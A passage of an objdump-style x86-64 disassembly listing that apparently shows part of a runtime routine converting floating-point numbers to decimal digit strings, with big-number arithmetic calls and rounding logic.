   32c485d79:	84 d2                	test   %dl,%dl
   32c485d7b:	0f 85 b0 0c 00 00    	jne    0x32c486a31
   32c485d81:	41 ba 1f 00 00 00    	mov    $0x1f,%r10d
   32c485d87:	44 2b 54 24 50       	sub    0x50(%rsp),%r10d
   32c485d8c:	8b 44 24 60          	mov    0x60(%rsp),%eax
   32c485d90:	41 83 ea 04          	sub    $0x4,%r10d
   32c485d94:	41 83 e2 1f          	and    $0x1f,%r10d
   32c485d98:	44 01 d0             	add    %r10d,%eax
   32c485d9b:	44 89 94 24 ac 00 00 	mov    %r10d,0xac(%rsp)
   32c485da2:	00 
   32c485da3:	45 89 d7             	mov    %r10d,%r15d
   32c485da6:	44 89 d2             	mov    %r10d,%edx
   32c485da9:	85 c0                	test   %eax,%eax
   32c485dab:	7e 1e                	jle    0x32c485dcb
   32c485dad:	89 c2                	mov    %eax,%edx
   32c485daf:	48 89 d9             	mov    %rbx,%rcx
   32c485db2:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c485db7:	e8 94 1a 00 00       	call   0x32c487850
   32c485dbc:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
   32c485dc3:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c485dc8:	48 89 c3             	mov    %rax,%rbx
   32c485dcb:	8b 44 24 50          	mov    0x50(%rsp),%eax
   32c485dcf:	01 c2                	add    %eax,%edx
   32c485dd1:	85 d2                	test   %edx,%edx
   32c485dd3:	7e 0b                	jle    0x32c485de0
   32c485dd5:	4c 89 c9             	mov    %r9,%rcx
   32c485dd8:	e8 73 1a 00 00       	call   0x32c487850
   32c485ddd:	49 89 c1             	mov    %rax,%r9
   32c485de0:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   32c485de7:	83 ff 02             	cmp    $0x2,%edi
   32c485dea:	41 0f 9f c3          	setg   %r11b
   32c485dee:	85 c0                	test   %eax,%eax
   32c485df0:	0f 85 82 05 00 00    	jne    0x32c486378
   32c485df6:	44 8b 54 24 48       	mov    0x48(%rsp),%r10d
   32c485dfb:	45 85 d2             	test   %r10d,%r10d
   32c485dfe:	0f 8f b4 02 00 00    	jg     0x32c4860b8
   32c485e04:	45 84 db             	test   %r11b,%r11b
   32c485e07:	0f 84 ab 02 00 00    	je     0x32c4860b8
   32c485e0d:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
   32c485e12:	45 85 c0             	test   %r8d,%r8d
   32c485e15:	0f 85 25 05 00 00    	jne    0x32c486340
   32c485e1b:	4c 89 c9             	mov    %r9,%rcx
   32c485e1e:	45 31 c0             	xor    %r8d,%r8d
   32c485e21:	ba 05 00 00 00       	mov    $0x5,%edx
   32c485e26:	e8 15 15 00 00       	call   0x32c487340
   32c485e2b:	48 89 d9             	mov    %rbx,%rcx
   32c485e2e:	48 89 c2             	mov    %rax,%rdx
   32c485e31:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c485e36:	e8 85 1b 00 00       	call   0x32c4879c0
   32c485e3b:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c485e40:	85 c0                	test   %eax,%eax
   32c485e42:	0f 8e f8 04 00 00    	jle    0x32c486340
   32c485e48:	c6 06 31             	movb   $0x31,(%rsi)
   32c485e4b:	48 8d 46 01          	lea    0x1(%rsi),%rax
   32c485e4f:	4c 89 c9             	mov    %r9,%rcx
   32c485e52:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c485e57:	e8 74 14 00 00       	call   0x32c4872d0
   32c485e5c:	8b 7c 24 4c          	mov    0x4c(%rsp),%edi
   32c485e60:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c485e65:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c485e6c:	00 
   32c485e6d:	83 c7 02             	add    $0x2,%edi
   32c485e70:	48 83 7c 24 58 00    	cmpq   $0x0,0x58(%rsp)
   32c485e76:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   32c485e7a:	74 14                	je     0x32c485e90
   32c485e7c:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c485e81:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c485e86:	e8 45 14 00 00       	call   0x32c4872d0
   32c485e8b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c485e90:	48 39 c6             	cmp    %rax,%rsi
   32c485e93:	72 14                	jb     0x32c485ea9
   32c485e95:	eb 18                	jmp    0x32c485eaf
   32c485e97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c485e9e:	00 00 
   32c485ea0:	48 83 e8 01          	sub    $0x1,%rax
   32c485ea4:	48 39 f0             	cmp    %rsi,%rax
   32c485ea7:	74 06                	je     0x32c485eaf
   32c485ea9:	80 78 ff 30          	cmpb   $0x30,-0x1(%rax)
   32c485ead:	74 f1                	je     0x32c485ea0
   32c485eaf:	48 89 d9             	mov    %rbx,%rcx
   32c485eb2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c485eb7:	e8 14 14 00 00       	call   0x32c4872d0
   32c485ebc:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c485ec1:	8b 7c 24 38          	mov    0x38(%rsp),%edi
   32c485ec5:	c6 00 00             	movb   $0x0,(%rax)
   32c485ec8:	41 89 7d 00          	mov    %edi,0x0(%r13)
   32c485ecc:	4d 85 f6             	test   %r14,%r14
   32c485ecf:	74 03                	je     0x32c485ed4
   32c485ed1:	49 89 06             	mov    %rax,(%r14)
   32c485ed4:	8b 44 24 40          	mov    0x40(%rsp),%eax
   32c485ed8:	41 09 04 24          	or     %eax,(%r12)
   32c485edc:	e9 67 f8 ff ff       	jmp    0x32c485748
   32c485ee1:	85 c0                	test   %eax,%eax
   32c485ee3:	0f 85 b7 0d 00 00    	jne    0x32c486ca0
   32c485ee9:	66 0f 28 c8          	movapd %xmm0,%xmm1
   32c485eed:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   32c485ef1:	f2 0f 58 0d ff 62 00 	addsd  0x62ff(%rip),%xmm1        # 0x32c48c1f8
   32c485ef8:	00 
   32c485ef9:	66 48 0f 7e c8       	movq   %xmm1,%rax
   32c485efe:	66 0f 7e ca          	movd   %xmm1,%edx
   32c485f02:	48 c1 e8 20          	shr    $0x20,%rax
   32c485f06:	2d 00 00 40 03       	sub    $0x3400000,%eax
   32c485f0b:	48 c1 e0 20          	shl    $0x20,%rax
   32c485f0f:	48 09 c2             	or     %rax,%rdx
   32c485f12:	49 89 d1             	mov    %rdx,%r9
   32c485f15:	f2 0f 5c 05 f3 62 00 	subsd  0x62f3(%rip),%xmm0        # 0x32c48c210
   32c485f1c:	00 
   32c485f1d:	66 49 0f 6e c9       	movq   %r9,%xmm1
   32c485f22:	66 0f 2f c1          	comisd %xmm1,%xmm0
   32c485f26:	0f 87 cb 0b 00 00    	ja     0x32c486af7
   32c485f2c:	66 0f 57 0d ec 62 00 	xorpd  0x62ec(%rip),%xmm1        # 0x32c48c220
   32c485f33:	00 
   32c485f34:	66 0f 2f c8          	comisd %xmm0,%xmm1
   32c485f38:	0f 87 43 07 00 00    	ja     0x32c486681
   32c485f3e:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c485f45:	00 
   32c485f46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c485f4d:	00 00 00 
   32c485f50:	8b 44 24 58          	mov    0x58(%rsp),%eax
   32c485f54:	85 c0                	test   %eax,%eax
   32c485f56:	0f 88 84 00 00 00    	js     0x32c485fe0
   32c485f5c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c485f61:	8b 4c 24 4c          	mov    0x4c(%rsp),%ecx
   32c485f65:	39 48 14             	cmp    %ecx,0x14(%rax)
   32c485f68:	7c 76                	jl     0x32c485fe0
   32c485f6a:	48 8b 0d cf 64 00 00 	mov    0x64cf(%rip),%rcx        # 0x32c48c440
   32c485f71:	48 63 44 24 4c       	movslq 0x4c(%rsp),%rax
   32c485f76:	f2 0f 10 14 c1       	movsd  (%rcx,%rax,8),%xmm2
   32c485f7b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   32c485f7f:	85 c0                	test   %eax,%eax
   32c485f81:	0f 89 39 fb ff ff    	jns    0x32c485ac0
   32c485f87:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c485f8b:	85 c0                	test   %eax,%eax
   32c485f8d:	0f 8f 2d fb ff ff    	jg     0x32c485ac0
   32c485f93:	0f 85 e8 06 00 00    	jne    0x32c486681
   32c485f99:	f2 0f 59 15 6f 62 00 	mulsd  0x626f(%rip),%xmm2        # 0x32c48c210
   32c485fa0:	00 
   32c485fa1:	66 0f 2f 94 24 88 00 	comisd 0x88(%rsp),%xmm2
   32c485fa8:	00 00 
   32c485faa:	0f 83 d1 06 00 00    	jae    0x32c486681
   32c485fb0:	c6 06 31             	movb   $0x31,(%rsi)
   32c485fb3:	48 8d 46 01          	lea    0x1(%rsi),%rax
   32c485fb7:	31 c9                	xor    %ecx,%ecx
   32c485fb9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c485fbe:	e8 0d 13 00 00       	call   0x32c4872d0
   32c485fc3:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c485fc7:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c485fce:	00 
   32c485fcf:	83 c0 02             	add    $0x2,%eax
   32c485fd2:	89 44 24 38          	mov    %eax,0x38(%rsp)
   32c485fd6:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c485fdb:	e9 b0 fe ff ff       	jmp    0x32c485e90
   32c485fe0:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   32c485fe7:	85 c0                	test   %eax,%eax
   32c485fe9:	0f 85 81 05 00 00    	jne    0x32c486570
   32c485fef:	44 8b 44 24 60       	mov    0x60(%rsp),%r8d
   32c485ff4:	45 85 c0             	test   %r8d,%r8d
   32c485ff7:	0f 84 d3 05 00 00    	je     0x32c4865d0
   32c485ffd:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   32c486001:	85 c9                	test   %ecx,%ecx
   32c486003:	0f 84 c7 05 00 00    	je     0x32c4865d0
   32c486009:	8b 54 24 60          	mov    0x60(%rsp),%edx
   32c48600d:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   32c486011:	39 ca                	cmp    %ecx,%edx
   32c486013:	89 c8                	mov    %ecx,%eax
   32c486015:	0f 4e c2             	cmovle %edx,%eax
   32c486018:	29 c2                	sub    %eax,%edx
   32c48601a:	29 c1                	sub    %eax,%ecx
   32c48601c:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c486023:	8b 44 24 68          	mov    0x68(%rsp),%eax
   32c486027:	89 54 24 60          	mov    %edx,0x60(%rsp)
   32c48602b:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   32c48602f:	85 c0                	test   %eax,%eax
   32c486031:	0f 85 a1 06 00 00    	jne    0x32c4866d8
   32c486037:	89 94 24 88 00 00 00 	mov    %edx,0x88(%rsp)
   32c48603e:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   32c486045:	00 00 
   32c486047:	e9 02 fd ff ff       	jmp    0x32c485d4e
   32c48604c:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
   32c486053:	01 00 00 00 
   32c486057:	8b 74 24 30          	mov    0x30(%rsp),%esi
   32c48605b:	b8 01 00 00 00       	mov    $0x1,%eax
   32c486060:	44 89 4c 24 64       	mov    %r9d,0x64(%rsp)
   32c486065:	44 89 94 24 9c 00 00 	mov    %r10d,0x9c(%rsp)
   32c48606c:	00 
   32c48606d:	85 f6                	test   %esi,%esi
   32c48606f:	0f 4f c6             	cmovg  %esi,%eax
   32c486072:	89 c1                	mov    %eax,%ecx
   32c486074:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c48607b:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c48607f:	e8 bc f0 ff ff       	call   0x32c485140
   32c486084:	44 8b 4c 24 64       	mov    0x64(%rsp),%r9d
   32c486089:	44 8b 94 24 9c 00 00 	mov    0x9c(%rsp),%r10d
   32c486090:	00 
   32c486091:	48 89 c6             	mov    %rax,%rsi
   32c486094:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c486098:	89 44 24 48          	mov    %eax,0x48(%rsp)
   32c48609c:	89 44 24 30          	mov    %eax,0x30(%rsp)
   32c4860a0:	e9 0e f8 ff ff       	jmp    0x32c4858b3
   32c4860a5:	0f 1f 00             	nopl   (%rax)
   32c4860a8:	01 44 24 50          	add    %eax,0x50(%rsp)
   32c4860ac:	89 44 24 70          	mov    %eax,0x70(%rsp)
   32c4860b0:	e9 1b f6 ff ff       	jmp    0x32c4856d0
   32c4860b5:	0f 1f 00             	nopl   (%rax)
   32c4860b8:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c4860bc:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   32c4860c0:	83 c0 01             	add    $0x1,%eax
   32c4860c3:	89 44 24 38          	mov    %eax,0x38(%rsp)
   32c4860c7:	85 c9                	test   %ecx,%ecx
   32c4860c9:	0f 84 41 03 00 00    	je     0x32c486410
   32c4860cf:	8b 94 24 88 00 00 00 	mov    0x88(%rsp),%edx
   32c4860d6:	44 01 fa             	add    %r15d,%edx
   32c4860d9:	85 d2                	test   %edx,%edx
   32c4860db:	7e 19                	jle    0x32c4860f6
   32c4860dd:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c4860e2:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c4860e7:	e8 64 17 00 00       	call   0x32c487850
   32c4860ec:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c4860f1:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c4860f6:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   32c4860fb:	8b 54 24 70          	mov    0x70(%rsp),%edx
   32c4860ff:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   32c486104:	85 d2                	test   %edx,%edx
   32c486106:	0f 85 5c 09 00 00    	jne    0x32c486a68
   32c48610c:	49 89 f2             	mov    %rsi,%r10
   32c48610f:	83 7c 24 64 02       	cmpl   $0x2,0x64(%rsp)
   32c486114:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
   32c486119:	ba 01 00 00 00       	mov    $0x1,%edx
   32c48611e:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   32c486122:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   32c486127:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   32c48612c:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   32c486131:	4d 89 d6             	mov    %r10,%r14
   32c486134:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c486139:	4c 89 6c 24 70       	mov    %r13,0x70(%rsp)
   32c48613e:	4c 89 a4 24 80 00 00 	mov    %r12,0x80(%rsp)
   32c486145:	00 
   32c486146:	0f 95 44 24 60       	setne  0x60(%rsp)
   32c48614b:	e9 a1 00 00 00       	jmp    0x32c4861f1
   32c486150:	48 89 d1             	mov    %rdx,%rcx
   32c486153:	e8 78 11 00 00       	call   0x32c4872d0
   32c486158:	ba 01 00 00 00       	mov    $0x1,%edx
   32c48615d:	45 85 ff             	test   %r15d,%r15d
   32c486160:	0f 88 ac 07 00 00    	js     0x32c486912
   32c486166:	44 0b 7c 24 30       	or     0x30(%rsp),%r15d
   32c48616b:	75 0a                	jne    0x32c486177
   32c48616d:	f6 45 00 01          	testb  $0x1,0x0(%rbp)
   32c486171:	0f 84 9b 07 00 00    	je     0x32c486912
   32c486177:	4d 8d 7e 01          	lea    0x1(%r14),%r15
   32c48617b:	4d 89 fb             	mov    %r15,%r11
   32c48617e:	85 d2                	test   %edx,%edx
   32c486180:	7e 0b                	jle    0x32c48618d
   32c486182:	80 7c 24 60 00       	cmpb   $0x0,0x60(%rsp)
   32c486187:	0f 85 97 09 00 00    	jne    0x32c486b24
   32c48618d:	45 88 6f ff          	mov    %r13b,-0x1(%r15)
   32c486191:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c486195:	39 84 24 ac 00 00 00 	cmp    %eax,0xac(%rsp)
   32c48619c:	0f 84 de 09 00 00    	je     0x32c486b80
   32c4861a2:	48 89 d9             	mov    %rbx,%rcx
   32c4861a5:	45 31 c0             	xor    %r8d,%r8d
   32c4861a8:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c4861ad:	e8 8e 11 00 00       	call   0x32c487340
   32c4861b2:	45 31 c0             	xor    %r8d,%r8d
   32c4861b5:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c4861ba:	48 89 f1             	mov    %rsi,%rcx
   32c4861bd:	48 89 c3             	mov    %rax,%rbx
   32c4861c0:	48 39 fe             	cmp    %rdi,%rsi
   32c4861c3:	0f 84 5f 01 00 00    	je     0x32c486328
   32c4861c9:	e8 72 11 00 00       	call   0x32c487340
   32c4861ce:	48 89 f9             	mov    %rdi,%rcx
   32c4861d1:	45 31 c0             	xor    %r8d,%r8d
   32c4861d4:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c4861d9:	48 89 c6             	mov    %rax,%rsi
   32c4861dc:	e8 5f 11 00 00       	call   0x32c487340
   32c4861e1:	48 89 c7             	mov    %rax,%rdi
   32c4861e4:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
   32c4861eb:	4d 89 fe             	mov    %r15,%r14
   32c4861ee:	8d 50 01             	lea    0x1(%rax),%edx
   32c4861f1:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
   32c4861f8:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   32c4861fd:	48 89 d9             	mov    %rbx,%rcx
   32c486200:	e8 4b f0 ff ff       	call   0x32c485250
   32c486205:	48 89 f2             	mov    %rsi,%rdx
   32c486208:	48 89 d9             	mov    %rbx,%rcx
   32c48620b:	41 89 c4             	mov    %eax,%r12d
   32c48620e:	44 8d 68 30          	lea    0x30(%rax),%r13d
   32c486212:	e8 a9 17 00 00       	call   0x32c4879c0
   32c486217:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   32c48621c:	48 89 fa             	mov    %rdi,%rdx
   32c48621f:	41 89 c7             	mov    %eax,%r15d
   32c486222:	e8 f9 17 00 00       	call   0x32c487a20
   32c486227:	48 89 c2             	mov    %rax,%rdx
   32c48622a:	8b 40 10             	mov    0x10(%rax),%eax
   32c48622d:	85 c0                	test   %eax,%eax
   32c48622f:	0f 85 1b ff ff ff    	jne    0x32c486150
   32c486235:	48 89 d9             	mov    %rbx,%rcx
   32c486238:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   32c48623d:	e8 7e 17 00 00       	call   0x32c4879c0
   32c486242:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c486247:	89 44 24 50          	mov    %eax,0x50(%rsp)
   32c48624b:	e8 80 10 00 00       	call   0x32c4872d0
   32c486250:	8b 54 24 30          	mov    0x30(%rsp),%edx
   32c486254:	8b 44 24 50          	mov    0x50(%rsp),%eax
   32c486258:	09 c2                	or     %eax,%edx
   32c48625a:	0f 85 45 04 00 00    	jne    0x32c4866a5
   32c486260:	8b 45 00             	mov    0x0(%rbp),%eax
   32c486263:	83 e0 01             	and    $0x1,%eax
   32c486266:	0b 44 24 64          	or     0x64(%rsp),%eax
   32c48626a:	0f 85 ed fe ff ff    	jne    0x32c48615d
   32c486270:	45 89 e8             	mov    %r13d,%r8d
   32c486273:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   32c486278:	4d 89 f2             	mov    %r14,%r10
   32c48627b:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c486280:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   32c486285:	4c 8b 6c 24 70       	mov    0x70(%rsp),%r13
   32c48628a:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   32c48628f:	44 89 e7             	mov    %r12d,%edi
   32c486292:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   32c486297:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   32c48629e:	00 
   32c48629f:	41 83 f8 39          	cmp    $0x39,%r8d
   32c4862a3:	0f 84 10 0b 00 00    	je     0x32c486db9
   32c4862a9:	45 85 ff             	test   %r15d,%r15d
   32c4862ac:	0f 8e 18 0c 00 00    	jle    0x32c486eca
   32c4862b2:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c4862b9:	00 
   32c4862ba:	44 8d 47 31          	lea    0x31(%rdi),%r8d
   32c4862be:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   32c4862c3:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   32c4862c8:	45 88 02             	mov    %r8b,(%r10)
   32c4862cb:	49 8d 42 01          	lea    0x1(%r10),%rax
   32c4862cf:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   32c4862d4:	90                   	nop
   32c4862d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4862dc:	00 00 00 00 
   32c4862e0:	4c 89 c9             	mov    %r9,%rcx
   32c4862e3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c4862e8:	e8 e3 0f 00 00       	call   0x32c4872d0
   32c4862ed:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c4862f2:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c4862f7:	48 85 c9             	test   %rcx,%rcx
   32c4862fa:	0f 84 90 fb ff ff    	je     0x32c485e90
   32c486300:	48 85 ff             	test   %rdi,%rdi
   32c486303:	0f 84 73 fb ff ff    	je     0x32c485e7c
   32c486309:	48 39 cf             	cmp    %rcx,%rdi
   32c48630c:	0f 84 6a fb ff ff    	je     0x32c485e7c
   32c486312:	48 89 f9             	mov    %rdi,%rcx
   32c486315:	e8 b6 0f 00 00       	call   0x32c4872d0
   32c48631a:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c48631f:	e9 58 fb ff ff       	jmp    0x32c485e7c
   32c486324:	0f 1f 40 00          	nopl   0x0(%rax)
   32c486328:	e8 13 10 00 00       	call   0x32c487340
   32c48632d:	48 89 c6             	mov    %rax,%rsi
   32c486330:	48 89 c7             	mov    %rax,%rdi
   32c486333:	e9 ac fe ff ff       	jmp    0x32c4861e4
   32c486338:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48633f:	00 
   32c486340:	4c 89 c9             	mov    %r9,%rcx
   32c486343:	e8 88 0f 00 00       	call   0x32c4872d0
   32c486348:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c48634d:	48 85 c9             	test   %rcx,%rcx
   32c486350:	0f 84 69 0b 00 00    	je     0x32c486ebf
   32c486356:	8b 44 24 30          	mov    0x30(%rsp),%eax
   32c48635a:	f7 d8                	neg    %eax
   32c48635c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   32c486360:	e8 6b 0f 00 00       	call   0x32c4872d0
   32c486365:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c48636c:	00 
   32c48636d:	48 89 f0             	mov    %rsi,%rax
   32c486370:	e9 3a fb ff ff       	jmp    0x32c485eaf
   32c486375:	0f 1f 00             	nopl   (%rax)
   32c486378:	4c 89 ca             	mov    %r9,%rdx
   32c48637b:	48 89 d9             	mov    %rbx,%rcx
   32c48637e:	44 88 5c 24 38       	mov    %r11b,0x38(%rsp)
   32c486383:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c486388:	e8 33 16 00 00       	call   0x32c4879c0
   32c48638d:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c486392:	44 0f b6 5c 24 38    	movzbl 0x38(%rsp),%r11d
   32c486398:	85 c0                	test   %eax,%eax
   32c48639a:	0f 89 56 fa ff ff    	jns    0x32c485df6
   32c4863a0:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c4863a4:	45 31 c0             	xor    %r8d,%r8d
   32c4863a7:	48 89 d9             	mov    %rbx,%rcx
   32c4863aa:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c4863af:	44 88 5c 24 48       	mov    %r11b,0x48(%rsp)
   32c4863b4:	83 e8 01             	sub    $0x1,%eax
   32c4863b7:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
   32c4863bc:	89 44 24 28          	mov    %eax,0x28(%rsp)
   32c4863c0:	e8 7b 0f 00 00       	call   0x32c487340
   32c4863c5:	44 8b 5c 24 78       	mov    0x78(%rsp),%r11d
   32c4863ca:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   32c4863cf:	48 89 c3             	mov    %rax,%rbx
   32c4863d2:	45 85 db             	test   %r11d,%r11d
   32c4863d5:	44 0f b6 5c 24 48    	movzbl 0x48(%rsp),%r11d
   32c4863db:	0f 9e c0             	setle  %al
   32c4863de:	41 21 c3             	and    %eax,%r11d
   32c4863e1:	8b 44 24 68          	mov    0x68(%rsp),%eax
   32c4863e5:	85 c0                	test   %eax,%eax
   32c4863e7:	0f 85 83 09 00 00    	jne    0x32c486d70
   32c4863ed:	45 84 db             	test   %r11b,%r11b
   32c4863f0:	0f 85 fb 08 00 00    	jne    0x32c486cf1
   32c4863f6:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c4863fa:	89 44 24 38          	mov    %eax,0x38(%rsp)
   32c4863fe:	8b 44 24 28          	mov    0x28(%rsp),%eax
   32c486402:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   32c486406:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c48640a:	89 44 24 48          	mov    %eax,0x48(%rsp)
   32c48640e:	66 90                	xchg   %ax,%ax
   32c486410:	8b 6c 24 48          	mov    0x48(%rsp),%ebp
   32c486414:	b8 01 00 00 00       	mov    $0x1,%eax
   32c486419:	48 89 f7             	mov    %rsi,%rdi
   32c48641c:	4d 89 cf             	mov    %r9,%r15
   32c48641f:	eb 24                	jmp    0x32c486445
   32c486421:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c486428:	48 89 d9             	mov    %rbx,%rcx
   32c48642b:	45 31 c0             	xor    %r8d,%r8d
   32c48642e:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c486433:	e8 08 0f 00 00       	call   0x32c487340
   32c486438:	48 89 c3             	mov    %rax,%rbx
   32c48643b:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
   32c486442:	83 c0 01             	add    $0x1,%eax
   32c486445:	4c 89 fa             	mov    %r15,%rdx
   32c486448:	48 89 d9             	mov    %rbx,%rcx
   32c48644b:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c486452:	48 83 c7 01          	add    $0x1,%rdi
   32c486456:	e8 f5 ed ff ff       	call   0x32c485250
   32c48645b:	44 8d 40 30          	lea    0x30(%rax),%r8d
   32c48645f:	44 88 47 ff          	mov    %r8b,-0x1(%rdi)
   32c486463:	39 ac 24 ac 00 00 00 	cmp    %ebp,0xac(%rsp)
   32c48646a:	7c bc                	jl     0x32c486428
   32c48646c:	49 89 fb             	mov    %rdi,%r11
   32c48646f:	4d 89 f9             	mov    %r15,%r9
   32c486472:	31 ff                	xor    %edi,%edi
   32c486474:	8b 44 24 64          	mov    0x64(%rsp),%eax
   32c486478:	85 c0                	test   %eax,%eax
   32c48647a:	0f 84 1b 03 00 00    	je     0x32c48679b
   32c486480:	83 f8 02             	cmp    $0x2,%eax
   32c486483:	0f 84 5d 03 00 00    	je     0x32c4867e6
   32c486489:	83 7b 14 01          	cmpl   $0x1,0x14(%rbx)
   32c48648d:	7f 3a                	jg     0x32c4864c9
   32c48648f:	8b 43 18             	mov    0x18(%rbx),%eax
   32c486492:	85 c0                	test   %eax,%eax
   32c486494:	75 33                	jne    0x32c4864c9
   32c486496:	85 c0                	test   %eax,%eax
   32c486498:	0f 95 c0             	setne  %al
   32c48649b:	0f b6 c0             	movzbl %al,%eax
   32c48649e:	c1 e0 04             	shl    $0x4,%eax
   32c4864a1:	89 44 24 40          	mov    %eax,0x40(%rsp)
   32c4864a5:	4c 89 d8             	mov    %r11,%rax
   32c4864a8:	e9 33 fe ff ff       	jmp    0x32c4862e0
   32c4864ad:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4864b4:	00 
   32c4864b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4864bc:	00 00 00 00 
   32c4864c0:	49 39 f3             	cmp    %rsi,%r11
   32c4864c3:	0f 84 b7 02 00 00    	je     0x32c486780
   32c4864c9:	4c 89 d8             	mov    %r11,%rax
   32c4864cc:	4d 8d 5b ff          	lea    -0x1(%r11),%r11
   32c4864d0:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   32c4864d4:	80 fa 39             	cmp    $0x39,%dl
   32c4864d7:	74 e7                	je     0x32c4864c0
   32c4864d9:	83 c2 01             	add    $0x1,%edx
   32c4864dc:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c4864e3:	00 
   32c4864e4:	41 88 13             	mov    %dl,(%r11)
   32c4864e7:	e9 f4 fd ff ff       	jmp    0x32c4862e0
   32c4864ec:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4864f0:	8b 54 24 70          	mov    0x70(%rsp),%edx
   32c4864f4:	4c 89 c9             	mov    %r9,%rcx
   32c4864f7:	e8 c4 11 00 00       	call   0x32c4876c0
   32c4864fc:	49 89 c1             	mov    %rax,%r9
   32c4864ff:	45 84 ff             	test   %r15b,%r15b
